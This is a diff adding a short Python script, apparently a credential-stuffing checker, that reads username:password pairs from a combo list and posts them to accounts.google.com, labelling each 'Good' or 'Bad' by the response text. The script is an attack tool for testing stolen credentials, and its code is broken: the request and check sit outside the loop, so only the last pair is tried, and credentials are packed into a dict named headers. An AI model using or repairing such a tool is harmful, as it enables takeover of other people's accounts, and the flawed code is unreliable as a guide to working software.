@@ -1,0 +1,27 @@
+import requests
+
+combolist = open("combo.txt", "r").readlines()
+
+url = "https://accounts.google.com/"
+
+for combo in combolist:
+    seq = combo.strip()
+    acc = seq.split(":")
+    
+    username = acc[0]
+    password = acc[1]
+    account = username + ":" + password
+    
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "identifierInput": username,
+    "password": password
+    
+ }
+req = requests.post(url, data=headers).text
+
+if not "Username" in req:
+    print("Good: "+ account)
+else:
+    print("Bad: " + account)
